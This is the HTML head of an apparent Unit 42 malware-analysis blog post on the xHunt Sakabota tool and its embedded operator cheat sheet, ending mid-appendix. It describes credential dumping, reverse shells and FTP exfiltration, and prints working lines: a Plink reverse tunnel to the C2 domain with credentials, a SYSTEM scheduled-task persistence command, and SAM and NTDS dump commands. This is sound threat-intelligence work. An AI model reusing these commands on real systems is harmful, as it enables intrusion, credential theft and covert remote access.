
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>xHunt Campaign: xHunt Actor’s Cheat Sheet</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/xhunt-actors-cheat-sheet/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="description" content="Researchers at Unit 42 found evidence that the developers who created the Sakabota tool had carried out two sets of testing activities on Sakabota in an attempt to evade detection. Within one sample created during this testing process, they uncovered a cheat sheet meant to assist operators of the tool to carry out activities on the compromised system and network, which we&#039;ve never seen before."/>
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="xHunt Campaign: xHunt Actor’s Cheat Sheet" />
<meta property="og:description" content="Researchers at Unit 42 found evidence that the developers who created the Sakabota tool had carried out two sets of testing activities on Sakabota in an attempt to evade detection. Within one sample created during this testing process, they uncovered a cheat sheet meant to assist operators of the tool to carry out activities on the compromised system and network, which we&#039;ve never seen before." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="Credential Harvesting" />
<meta property="article:tag" content="malware" />
<meta property="article:tag" content="Sakabota" />
<meta property="article:tag" content="xHunt" />
<meta property="article:section" content="Unit 42" />
<meta property="article:published_time" content="2019-12-05T04:00:17+00:00" />
<meta property="article:modified_time" content="2020-01-24T20:44:32+00:00" />
<meta property="og:updated_time" content="2020-01-24T20:44:32+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3-1024x512.png" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3-1024x512.png" />
<meta property="og:image:width" content="1024" />
<meta property="og:image:height" content="512" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="Researchers at Unit 42 found evidence that the developers who created the Sakabota tool had carried out two sets of testing activities on Sakabota in an attempt to evade detection. Within one sample created during this testing process, they uncovered a cheat sheet meant to assist operators of the tool to carry out activities on the compromised system and network, which we&#039;ve never seen before." />
<meta name="twitter:title" content="xHunt Campaign: xHunt Actor’s Cheat Sheet" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3.png" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; xHunt Campaign: xHunt Actor’s Cheat Sheet Comments Feed" href="https://unit42.paloaltonetworks.com/xhunt-actors-cheat-sheet/feed/" />
<meta property="og:likes" content="11"/>
<meta property="og:readtime" content="19"/>
<meta property="og:views" content="20,140"/>
<meta property="og:date_created" content="December 4, 2019 at 8:00 PM"/>
<meta property="og:post_length" content="5706"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit-42/"/>
<meta property="og:author" content="Robert Falcone"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/robertfalcone/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<meta property="og:post_image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d3-380x184.png"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"xHunt Campaign: xHunt Actor\u2019s Cheat Sheet","name":"xHunt Campaign: xHunt Actor\u2019s Cheat Sheet","description":"Unit 42 found evidence that the developers who created the Sakabota tool had carried out two sets of testing activities on Sakabota in an attempt to evade detection. Within one sample created during this testing process, we uncovered a cheat sheet meant to assist operators of the tool to carry out activities on the compromised system and network, which we've never seen before.","url":"https:\/\/unit42.paloaltonetworks.com\/xhunt-actors-cheat-sheet\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/xhunt-actors-cheat-sheet\/","datePublished":"December 4, 2019","articleBody":"Executive Summary\r\nUnit 42 has been researching the xHunt attack campaign on Kuwaiti organizations for several months. Recently, we found evidence that the developers who created the Sakabota tool, which was previously discussed in the xHunt campaign, had carried out two sets of testing activities in July and August 2018 on Sakabota in an attempt to evade detection. These testing activities involved the developer compiling several variations of the tool with slight changes made to the code base, each of which the developer will submit to online antivirus scanning services to determine the vendors that detect their tool. The name Sakabota appears to be referencing a sword named Sakabato in an anime called \u201cRurouni Kenshin,\u201d which fits the anime-themed tool names seen in the 2019 XHunt campaign.\r\n\r\nWhile analyzing the Sakabota samples created by the developer in these testing activities, we found a cheat sheet that the developers included within the tool, which we suspect was meant to help the operator of the tool carry out activities on the compromised system and network. This is the first time we\u2019ve seen a malware developer include a cheat sheet of example commands to assist the operator in carrying out the activities on the compromised system and network. We believe the inclusion of this cheat sheet within the tool may suggest that the developer and operator of the Sakabota tool are different individuals.\r\n\r\nThe cheat sheet includes examples of commands needed for persistence, network reconnaissance, pivoting, credential dumping, general system and network data gathering, as well as data exfiltration and commands to configure the system to allow remote desktop protocol (RDP) sessions. The commands provide insight into the techniques the actors will use after compromising a system, as well as the tools used to achieve their objectives. The commands also suggest that the threat group heavily relies on RDP to interact with compromised hosts, likely using secure shell (SSH) tunnels created with the Plink tool between the infected system and an actor-controlled domain. Also, the command examples show the threat group seeks to move across an infiltrated network to target additional devices, making it a greater threat to organizations once infected. According to these commands, the actor would likely make these pivots to other systems by performing credential dumping from the Windows registry and process memory.\r\n\r\nSome of the command examples include a domain or IP address, one of which overlaps with a domain that the group used to deliver CASHY200 payloads configured with firewallsupports[.]com as its command &amp; control system (C2) that we discussed in our previous blog on xHunt. The cheat sheet also suggests the actors will use scheduled tasks for persistence, which included one scheduled task name that was used for persistence in the previously mentioned CASHY200 payload.\r\n\r\nWe have provided an analysis of the Sakabota tool, specifically version 1.4, including all of its functionality in the Appendix.\r\nTesting Sakabota\r\nWhile gathering Sakabota samples during our xHunt research, we came across several samples compiled between July and August 2018, which the developer created during two rounds of testing. The first round of these testing activities occurred on July 21 and 23, 2018, while the second round of testing occurred on August 6 and 7, 2018. Unlike our analysis of testing activities performed by other threat groups, we will provide a higher level synopsis of the activities rather than providing the minute changes made in each iteration.\r\n\r\nBoth rounds of testing included iterations where the developer either made slight changes to the codebase itself or used different obfuscation tools to see how these changes affected the detection rate of the Sakabota tool. In addition to changes made to the codebase and obfuscators, the developer also modified the embedded resources within the Sakabota tool to determine if they were causing detection as well. Based on the changes between the last sample from the first round on July 23rd and the first sample in the second round of testing on August 6th, we believe the two rounds of testing are one continuous testing activity with a two-week gap between them rather than two separate testing efforts.\r\n\r\nThe first round of testing started with the oldest known version of Sakabota, specifically 1.4.0.0, and resulted in a new version of 1.5.0.0. The second round of testing started with Sakabota 1.5.0.0 and resulted in a new version of 1.6.0.0. During the two rounds, the developer tested several different crypters and obfuscators, including \u201cConfuser,\u201d \u201cConfuserEx,\u201d \u201cCodeVeil,\u201d and two different versions of \u201c.NET Reactor.\u201d Ultimately, in the second round of testing the developer determined that one of the \u201c.NET Reactor\u201d versions (possibly 4.8 or 4.9) resulted in the lowest detection rate, which prompted the developer to continue using this version of \u201c.NET Reactor\u201d for the remainder of the testing activities.\r\n\r\nIn addition to making changes to the code base and testing various obfuscators, the tester also made modifications to or removed resources embedded within the samples. The most interesting change to resources occurred in the first iteration of the July testing, where the developer modified the \u2018k\u2019 resource that was initially a text file that contained a cheat sheet for the actor to a blank document that contained nothing more than a byte order mark (U+FEFF).\r\nSakabota Cheat Sheet\r\nDuring our analysis of the testing activities related to Sakabota, the oldest known sample (SHA256:\r\n5b5f6869d8e7e5746cc9bec58694e4e0049aef0dcac5dfd595322607ba10e1ae) had an embedded resource named \u2018k\u2019. This resource contained text that at first glance appeared to be usage instructions for the tool, however, on further inspection it is a cheat sheet for the operators using Sakabota in how to perform a variety of activities once they have access to the targeted system and network. This cheat sheet gave us unprecedented insight into the tools and techniques the actor using Sakabota uses once they gained access to the compromised system. The cheat sheet also included domains and IP addresses within the example commands, which confirms our analysis that these network artifacts belong to this threat group\u2019s infrastructure.\r\n\r\nTo access this cheat sheet, an operator would click the Knoldege button within Sakabota\u2019s GUI, which would display the cheat sheet in a scrolling text box immediately to the right of the button. Figure 1 shows the Sakabota GUI with the Knoldege button clicked and the cheat sheet displayed in green text.\r\n\r\n\r\nFigure 1. Sakabota\u2019s GUI displaying cheat sheet\r\nThe cheat sheet is separated into several sections, based on the purpose of the example commands. Fortunately, the commands listed in the cheat sheet provides us with a great deal of insight into some of the tools and techniques the actors will possibly use after compromising the end system. The cheat sheet shows significant batch and PowerShell scripting and a preference for using RDP, as well as the following tools not provided natively in Windows (i.e. thc-hydra, Plink, Mimikatz, Powercat, ProcDump, SharpHound\/BloodHound and PowerSploit). Table 1 shows the headers and a description of each section within the cheat sheet.\r\n\r\n\r\n\r\nSection Heading\r\nDescription\r\n\r\n\r\nHydra\r\nProvides an example command on how to run the thc-hydra tool to brute force an RDP login on a single IP address using text files with the username and password combinations.\r\n\r\n\r\nPass The Hash\r\nProvides two examples of arguments needed to pass-the-hash to run a command on a remote system using Mimikatz. The command in both examples use the psexec tool to run 'cmd.exe' on the remote system.\r\n\r\n\r\nWMIC with Bat\r\nProvides an example windows management interface command (WMIC) with arguments to run a batch script (\"c:\\temp\\a.bat\") using the 'process call create' with supplied username and password.\r\n\r\n\r\nPlink\r\nProvides example command-line commands to use Plink (PuTTY Link) to create an SSH tunnel between a remote system and the local system to allow the actor to remotely access the compromised system via remote desktop (RDP). The command instructs Plink to connect to the remote system, in the two examples were 'pasta58[.]com' and '176.9.235[.]101' over TCP port 25 and to authenticate to these remote systems using the username of 'bor' and the password '123321'. The example commands use 'svphost' as the application name, which is the same filename that Sakabota would use to install Plink to the system (\"svphost.exe\").\r\n\r\n\r\nLSASS Process\r\nProvides five example commands that use ProcDump, Mimikatz and PowerSploit's Out-Minidump function to dump the 'lsass.exe' process memory. Two of the command specifically dump the contents to a file located at 'c:\\mydump.dmp', while another saves the memory to a file named 'lsass.dmp'.\r\n\r\n\r\nWDigest\r\nProvides the command line commands to use the 'reg' application to query and modify the WDigest registry key 'UseLogonCredential' that instructs Windows to store credentials in memory in cleartext or not. Setting this key to '0' is a suggested mitigation to Mimikatz credential dumping, which is likely why the cheat sheet provides the 'reg' command to set this key to '1' to enable it.\r\n\r\n\r\nPowercat\r\nProvides example commands for both the client and the server to create a remote shell and transfer files using the powercat PowerShell tool. The remote systems that the commands would connect to are 'pasta58[.]com' and '213.202.217[.]31' over TCP port 443. This section also provides an example PowerShell command to download powercat from 'hxxp:\/\/pasta58[.]com\/pk.txt' and to save the result to 'c:\\users\\public\\pc.ps1' before creating a remote shell to 'pasta58[.]com'.\r\n\r\n\r\nNtds\r\nProvides example commands to save the 'Security Account Manager' (SAM) registry hive using the 'reg' application and Mimikatz's 'lsadump::sam' command. This section of the cheat sheet also includes login credentials to 'CMD5.org', which we believe the actor would use to crack hashes extracted from the registry dump files.\r\n\r\n\r\ntaskch\r\nProvides example commands to delete, create and run scheduled tasks. The scheduled tasks in the examples have the names 'WindowsUpdateTolkit' and 'WindowsUpdateTolkit_1' and would run 'SystemRecoverytolkit.ps1' and 'TempSystemRecovery.vbs', all but 'WindowsUpdateTolkit_1' were used to create persistence for CASHY200 payloads in xHunt related attacks.\r\n\r\n\r\nDownload from CMD\r\nProvides a PowerShell command to download a file from 'hxxp:\/\/pasta58[.]com\/r.t' and save to 'c:\\windows\\temp\\temp\\run.bat'.\r\n\r\n\r\nFTP Powershell\r\nProvides a PowerShell command that uploads a file 'C:\\users\\public\\P.txt' to 'ftp:\/\/pasta58[.]com\/P.txt' using the login username 'admin' and 'sak' as a password.\r\n\r\n\r\nFTP From CMD\r\nProvides command line commands using echo to create a file named 'ftpcmd.dat' that contains the necessary commands to log into the FTP server at 'pasta58[.]com' using 'administrator' as the username and 'QwErTyUiOp123456' as the password to upload a file named 'TRR.txt'.\r\n\r\n\r\nFireWall\r\nProvides six example commands to add, delete and show rules from the local Windows Firewall using the 'netsh' application. The example commands include the creation of rules to allow inbound network traffic to the Plink application saved to 'svphost.exe' discussed in the Plink section, as well as inbound traffic over TCP port 22.\r\n\r\n\r\nRDP NLA\r\nProvides a PowerShell command that disables Network Level Authentication (NLA) for RDP. The command uses WMI to call the 'SetUserAuthenticationRequired' method to disable the 'UserAuthenticationRequired' property in 'Win32_TSGeneralSetting'. NLA requires the user to authenticate prior to the creation of an RDP session with a server, so we believe the actor would disable NLA to allow RDP sessions over the tunnel created with Plink.\r\n\r\n\r\nRDP Port\r\nProvides example commands using the 'reg' application to query and add values to keys in 'hklm\\system\\currentControlSet\\Control\\Terminal Server'. The queries in the cheat sheet would allow the actor to view the port number that RDP uses and if the 'AllowTSConnections' setting is enabled to allow RDP sessions. The cheat sheet also has two 'reg' commands to add values to the registry keys 'AllowTSConnections' and 'fDenyTSConnections' to enable RDP sessions.\r\n\r\n\r\nWinRAR\r\nProvides WinRAR command line commands to recursively archive folders. One of the examples outputs multi-volume RAR archives split into 153,600KB files.\r\n\r\n\r\nDB\r\nContains a variety of SQL queries related to navigating an unknown database. Based on the tables and column names, it appears that these queries attempt to extract customer information and call detail records (CDR), which is likely associated with telecommunications.\r\n\r\n\r\nGet Users\r\nProvides the commands to run the Local.exe and Dsquery.exe tools to gather user information from a specified remote system or domain.\r\n\r\n\r\nScan For\r\nProvides three commands that use for loops to scan a local subnet (specifically a \/24) to locate systems responding to ping requests, to check for file shares using the 'net use' application with 'administrator' as the username and 'P@ssw0rd' as the password and to check for systems whose 'C:' drive is shared using the 'dir' command.\r\n\r\n\r\nRoute Print\r\nThis section was blank.\r\n\r\n\r\nScripting\r\nProvides two \"scripts\", one that reads locations from 'c:\\test.txt' that it will iterate through and use as the argument to the 'ping' command, while the second pings \"www.google.com\" and checks the response for the string \"Reply\".\r\n\r\n\r\nBase 64\r\nProvides two commands that use the 'certutil' application and the '-encode' and '-decode' to convert 'test.exe' to 'test.txt' and vice versa.\r\n\r\n\r\nPantest\r\nIncludes some Google search operators that the actor could likely use to find web servers of interest. The search operators include 'site' searches for '.sa', '.kw', '.ph' and '.ir', 'ext' for 'asp', 'aspx', 'php' and 'jsp', 'inurl' for 'login' and 'admin' and 'intext' for '---', 'Mysql_num_rows' and 'Apache\/2.4.12 (Win32) OpenSSL\/1.0.1m PHP\/5.6.11'. The cheat sheet also provides several examples of SQL injection techniques with a ticular focus on XAMPP servers.\r\n\r\n\r\n\r\nTable 1. Sections within Sakabota\u2019s cheat sheet and a description of their contents\r\nWhile the cheat sheet does not include a specific header, it does include example commands explaining how to use PowerShell to run Sharphound, which is the C# variant of the Bloodhound tool. Bloodhound is an open-source tool used to discover relationships between objects in an Active Directory environment. Many red teamers use Bloodhound to determine attack paths from a controlled asset on the breached network to their objective. The specific arguments in the example command instruct Bloodhound to use the following collection methods:\r\n\r\n \tACL - Collect ACL (Access Control List) data\r\n \tObjectProps - Collects node property information for users and computers\r\n \tDefault - Collects Group Membership, Local Admin, Sessions, and Domain Trusts\r\n\r\nThe inclusion of these commands in the cheat sheet suggests that the actors would also leverage Bloodhound for the same reason a red teamer would: specifically mapping out attack paths once they gain access to the network. These attack paths allow the adversary to determine what systems and accounts they should focus their efforts on to eventually gain access to the systems and accounts needed to achieve their objectives.\r\n\r\nThe cheat sheet also included the following domain and IP addresses of interest in the example commands that we associate with the threat actor\u2019s infrastructure:\r\n\r\n \tpasta58[.]com\r\n \t176.9.235[.]101\r\n \t213.202.217[.]31\r\n\r\nThe 213.202.217[.]31 IP address resolved the domain dl.kcc.com[.]kw that was used to host the delivery documents installing the CASHY200 payload in the July 2018 attacks discussed in our previous blog on xHunt. The 176.9.235[.]101 IP address was resolved to by pasta58[.]com, which is a known Sakabota C2 domain. We also observed this IP address and domain included as auto-complete entries within certain fields of Sakabota\u2019s GUI (see Appendix), of which also included the IP address 23.227.207[.]233 also previously resolved to by pasta58[.]com. While this does not provide any new infrastructure, it strengthens our linkages between these entities within the infrastructure and their association with the threat actors involved.\r\nConclusion\r\nWhile researching the tools associated with the xHunt campaign, we discovered testing activities carried out by a developer that is associated with this attack campaign. During this testing activity, we found a sample of Sakabota that contained a cheat sheet for the operators that provided significant insight into the tools, tactics, and techniques likely associated with these threat actors. We occasionally see malware developers including usage instructions within their tools to help an operator understand how to use various functionalities within the tool, but we\u2019ve never seen a malware developer include a cheat sheet of example commands to assist the operator in carrying out the activities on the compromised system and network. Not only did this cheat sheet give us unprecedented insight into the tools and commands they would likely execute on the system, but it also provided references to network locations within their infrastructure.\r\n\r\nPalo Alto Networks customers are protected from the tools mentioned in this blog through the following:\r\n\r\n \t\r\n\r\n \tCustomers using AutoFocus can view this activity by using the Sakabota tag\r\n \tC2 domain pasta58[.]com is classified as malicious in Threat Prevention, DNS Security and URL Filtering.\r\n \tAll Sakabota samples identified are detected as malicious by WildFire and Traps.\r\n\r\n\r\n\r\nAppendix\r\nIndicators of Compromise\r\nSakabota Infrastructure\r\npasta58[.]com\r\n\r\n176.9.235[.]101\r\n\r\n213.202.217[.]31\r\n\r\n23.227.207[.]233\r\nSakabota SHA256\r\n7cfd75ab4822b489f74e83d3046536509c44b29b72b43125b0eca1fe449b5953\r\n\r\n5b5f6869d8e7e5746cc9bec58694e4e0049aef0dcac5dfd595322607ba10e1ae\r\n\r\n335e9eb0bb571ca81cc6829483f0b8d015627f8301373756d04d844cde04918d\r\n\r\n40b18a1c06888f8e116b6de21f70359b9763b8066c764542ff3816c118b7d482\r\n\r\n8e18b28dc7351b0e7928b0f5373a6e987ba6d084d84bfd0b29e7f458ca5401e5\r\n\r\nea31e5afec3b94635e98473183ec420e9c3e6fd13b618dadb5b34bf5c257a5aa\r\n\r\n66e57d2909e37d39791bee91eb9e8121aa48ea89eae8a09275ae078e9dda2f50\r\n\r\n2d7ff8d3aee31cd2f384d74e6b0f07ecda2cea860fb3210c9afe66bc7cc6f90b\r\n\r\ndf0f874219ffac8038290eb4a39ba6686edc35de8913563f8ddc9644ad4bde64\r\n\r\nd0f57e566c6b457d6e97dc02266d67d81ef561fba50a86e9f9fc889dc5167068\r\n\r\nd80aeb4fb326af0bf1179c4fcf2ad01cf98ddab81f709e690bbd728c027064e9\r\n\r\ncc21bc11d9aed226e9c511480e54bb1305cea086ab0b5e310de68228debdc80e\r\n\r\nbf7a448ef2603cce5488d97474c913ba14c9550d03cc5e387fe31eb416dc0259\r\n\r\n161cfe70ea0022ef7aefffba93b3958ab09d7df6e61cc88d1c27e4917f554de4\r\n\r\n224539e69c184d75ac59378ecab7914bcbe360310bb82add395d59e9e11d1419\r\n\r\nb9c56da9e911dc85b06f8dc9d1a486663af8f982511e1c3ad568e635e2323274\r\n\r\n9a431838f2613454c5630a5f186f0aee240dfc5723bd6e1b586bb4118cc3aab7\r\n\r\ndb1f460f624a4c13c3004899c5d0a4c3668ba99bb1e6be7f594e965c637b6917\r\n\r\nb73facbf55053519b5da29397cfd3beea519e9f1bd41c50b6c2f3f1b4eca15a3\r\n\r\n761635c23f3c98a8d18e48c767fff2b0ec321b58064b404ea1b2b4a555913296\r\n\r\n47ca763da840fdee68b97e8d53cbc56b3f90e4d6532f0b1501b90175b8fca24f\r\nSakabota Tool\r\nThe Sakabota Tool allows threat actors involved with the xHunt campaign the ability to carry out post-exploitation activities, such as performing network reconnaissance, dumping credentials and interacting with discovered systems. Like other tools seen in the xHunt campaign, an actor can use the Sakabota tool from the command line or by interacting with its graphical user interface (GUI). We will discuss Sakabota\u2019s functionality available from the command line and GUI, as the offered functionality differs dramatically. While we did not observe this activity, we speculate that the actor would use the command line interface to do initial data gathering after compromising a system and would use it to create a tunnel to establish an RDP session. After connecting to the system via RDP, we believe the actor would then use Sakabota\u2019s GUI to take advantage of its increased capabilities.\r\nCommand Line Functionality\r\nThe actor can use Sakabota\u2019s command-line interface by including any command-line arguments, otherwise, Sakabota will display its GUI instead of the command-line. The developer of Sakabota included usage instructions that actors can view by including the -help switch, as seen in Figure 2.\r\n\r\n&nbsp;\r\n\r\n\r\nFigure 2. Sakabota\u2019s command-line interface displaying usage instructions\r\nThe -Up command will upload a file or a folder\u2019s files to the hardcoded C2 location of ftp:\/\/www.pasta58[.]com\/&lt;filename&gt; using the FTP protocol and a username and password of Administrator and Mono8&amp;^Uj.\r\n\r\nThe -Tanbo command writes an embedded NirCmd application by NirSoft to SC.exe in the current directory and uses this tool to take a screenshot of the system. The command will save the screenshot to the current directory named Screen_&lt;computer name&gt;_&lt;username&gt;.png. The -Tanbo-up command performs the same screenshot activity, but will upload the file to the C2 using FTP and the same credentials as the -Up command and delete the screenshot file from the system.\r\n\r\nThe -Shuriken and -Shuriken-v commands allow the actor to scan a remote system at 23.227.207[.]233 for open TCP ports, likely to determine the TCP ports allowed outbound from a stateful firewall. The \u2018-Shuriken\u2019 command will scan a list of TCP ports, specifically 123, 443, 80, 81, 23, 21, 22, 20, 110 and 25, while the -Shuriken-v command allows the actor to specify the TCP port to scan. The IP address 23.227.207[.]233 resolved to pasta58[.]com, which is the C2 domain used by this Sakabota sample.\r\n\r\nThe -Rev command saves an embedded PuTTY Link tool, also known as Plink to c:\\users\\public\\svphost.exe and uses this tool and the following command-line arguments to create an SSH tunnel to allow the actor to create a remote RDP session on the system:\r\n\r\nsvphost pasta58[.]com -C -R 0.0.0.0:1991:127.0.0.1:3389 -l bor -pw 123321 -P &lt;TCP port provided on command line&gt;\r\n\r\nThe -Rev-loop command attempts to continually create an SSH tunnel to create a remote RDP session every ten minutes by creating a scheduled task named update.windows with the following command:\r\n\r\nschtasks \/create \/sc minute \/mo 10 \/f \/tr \"cmd \/c cd c:\\users\\public &amp; echo y | svphost pasta58.com -C -R 0.0.0.0:1991:127.0.0.1:3389 -l bor -pw 123321 -P &lt;TCP port provided on command line&gt;\" \/tn update.windows \/ru SYSTEM\"\r\nGUI Functionality\r\nThe Sakabota tool has more functionality available to the actor from its GUI. The developers of Sakabota wanted to restrict others from using their tool, so they added a password screen that requires the individual to enter a password before being able to use the functionality provided by Sakabota\u2019s GUI. Figure 3 shows Sakabota\u2019s password dialog, which has the title Snapping Tool and requires a password of 92, both of which are the same as the Gon tool discussed in the Appendix of our initial xHunt blog.\r\n\r\n\r\nFigure 3. Password screen displayed when opening the Sakabota GUI\r\nAfter entering the correct password, Sakbota displays its main interface, as seen in Figure 4. Sakabota\u2019s main interface has a window title that begins with the string \u201cSakabota ---&gt;\u201c followed by system information, which includes the domain name, computer name, username, and if the system has Internet access. Much like the password screen, the window title is very similar in structure to the Gon tool, with the Gon tool\u2019s window title starting with the string \u201cxHunter ---&gt;\u201d and Sakabota including the boolean for Internet connectivity.\r\n\r\n\r\nFigure 4. Sakabota\u2019s main interface\r\nSakabota\u2019s main interface has a tabular design, with each tab containing different functionality. Common amongst all the tabs is the bottom portion of the interface, which has several buttons and additional system information, such as the system\u2019s local IP address and the IP address for its DNS server, as well as the usernames currently logged into the system. This area also has several buttons that the actor can use to perform clean-up and self-destruct actions, as well as apply some generic settings. Table 2 provides a list of the buttons and a description of their functionality.\r\n\r\n\r\n\r\nButton\r\nDescription\r\n\r\n\r\nClear Tracks\r\nCleans up actors activities by deleting registry keys used to store recent systems connected to via RDP (\"Software\\Microsoft\\Terminal Server Client\\Default\"), recent applications run (\"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\"), recent typed paths in Windows Explorer (\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TYPEDPATHS\") and recent search terms (\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery\").\r\n\r\n\r\nRDP SC\r\nEnables CredSSP for RDP sessions to use the current credentials to authenticate to the remote system by writing enablecredsspsupport:i:0 to the Default.rdp file.\r\n\r\n\r\nR\r\nOpens an explorer window with the results directory for scans and other commands.\r\n\r\n\r\nKnoldege\r\nDisplays a cheat sheet for the actor in text box directly next to the button.\r\n\r\n\r\n#\r\nEnables\/disables option called Personal Use that enables\/disables an inactivity timer that Sakabota uses to hide its user interface to avoid detection.\r\n\r\n\r\n@\r\nEnables the RDP interrupt functionality that will close Sakabota and clean up the actors by running the same function as the Clear Tracks button, but also deletes the folder used to store command results and the Sakabota tool itself.\r\n\r\n\r\n(\r\nEnables and disables Silent Mode, which if enabled will ask the user if they would like to save scanning results to a file in addition.\r\n\r\n\r\nHara-K\r\nSelf-destruct mechanism, which will delete the Sakabota executable before exiting. Abbreviated \u2018Harakiri\u2019, which is a term for suicide in Japanese.\r\n\r\n\r\n\r\nTable 2. Buttons at the bottom of Sakabota\u2019s main interface\r\nThe \u2018Info\u2019 tab seen in Figure 4 has several capabilities specifically focused on gathering information from systems on the network. This tab allows the actor to use an embedded \u2018dsquery\u2019 tool (SHA256:\r\n4c8c4e574b9d1dc05257a5c17203570ff6384d031c6e6284fbc0020fe63b719e)\r\nto query Active Directory to gather information on computers, user and groups attached to the domain. This tab also allows the actor to scan IP addresses for specific services such as RDP, SMB, FTP, HTTP(s), telnet, and SSH. This tab also allows the actor to perform TCP port scan for systems on specified network ranges and connect to remote systems using the net use command. Lastly, the actor can install a legitimate Microsoft tool called Local.exe (SHA256: 450ebd66ba67bb46bf18d122823ff07ef4a7b11afe63b6f269aec9236a1790cd) and use this tool to list the administrator accounts on a specified IP address on the local network.\r\n\r\nSakabota\u2019s remotes tab, seen in Figure 5, is dedicated to providing the actor the ability to interact with remote systems. First, this tab allows the actor to use Windows Management Instrumentation (WMI) to run commands on remote systems, in which the actor would provide the desired command in the \u2018Code\u2019 text box. The \u2018Code\u2019 text box contains auto-complete suggestions that provides us insight into some of the commands the developer expects the actor to run, such as gathering information on the user and network interfaces; however, the following commands within the auto-complete suggestions (with the exception of Whoami and query user) contain errors, such as missing spaces or added spaces or are not valid commands that would result in errors rather than running the application correctly:\r\n\r\nWhoami\r\nipconfig\/all\r\nquery user\r\nnet stat -na\r\nScreen Shot\r\n\r\nThe \u2018PSEXEC\u2019 portion of this tab allows the actor to install an embedded PSExec tool to the system and use it to connect to a remote system using supplied credentials. The Remote button uses PSExec to launch a command prompt process on the remote system, while the Clean button attempts to kill the process running PSEXESVC.exe and delete this executable on the remote system. The PLink portion of the tab allows an actor to install an embedded PuTTY Link (PLink) tool (SHA256:\r\n04e5f50dd90d5b88b745ef108c06a3ef1e297018cb3fe8acc80dd55250dfee68) to the system and use it to create an SSH tunnel between the system and an external server over TCP port 3389. We believe the actor uses this tunnel to connect to non-Internet facing systems using RDP. Sakabota uses the As_backdoor radio box to create a scheduled task named update.windows that attempts to create the tunnel every 20 minutes, whereas Sakabota uses the As_System rox to create a scheduled task named mytask that runs once at 12:00 AM. The actor would provide the location of their server in the Server IP box that Sakabota will use to create a tunnel to which the developer included the following locations within auto-complete options:\r\n\r\n \t176.9.235[.]101\r\n \tpasta58[.]com\r\n\r\nThe \u2018PASS THE HASH\u2019 portion of the \u2018Remotes\u2019 tab suggests that the tool attempts to use the pass-the-hash technique to authenticate to a remote system, however, the tool does not have any functional code that uses these text boxes and the \u2018Pass\u2019 button does not have any event handling if its clicked.\r\n\r\n\r\nFigure 5. Sakabota\u2019s \u2018Remotes\u2019 tab \r\nSakabota\u2019s Passwords tab, seen in Figure 6 has functionality dedicated to dumping credentials from the system. The \u2018MIMI\u2019 portion of this tab allows the actor to load a supplied mimikatz executable and execute it with the arguments \u2018log privilege::debug sekurlsa::logonpasswords exit\u2019. The \u2018Digest\u2019 button allows the actor to attempt to circumvent a Mimikatz mitigation by setting the following registry key to \u20181\u2019, which instructs Windows to store credentials in memory:\r\n\r\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential\r\n\r\nThe \u2018SAM\u2019 portion allows an actor to dump the SAM hive from the registry by using either the supplied Mimikatz tool with the arguments \u2018log privilege::debug token::whoami token::elevate lsadump::sam exit\u2019, or by running the following two command-line commands:\r\n\r\nReg save hklm\\sam &lt;supplied folder name&gt;\\sam\r\nReg save hklm\\system &lt;supplied folder name&gt;\\system\r\n\r\nThe \u2018NTDS\u2019 portion allows an actor to obtain a copy of a domain controller by creating an installation media using the \u2018ntdsutil\u2019 application. We have seen adversaries use this technique to create a clone of the domain controller that they exfiltrate for backup and offline processing purposes. The actor will select a folder to save the output and click the \u2018SnapShot\u2019 button that will run the following command to take a snapshot of the domain controller:\r\n\r\nntdsutil \"activate instance ntds\" ifm \"create full &lt;actor provided path&gt;\\ntds\" quit 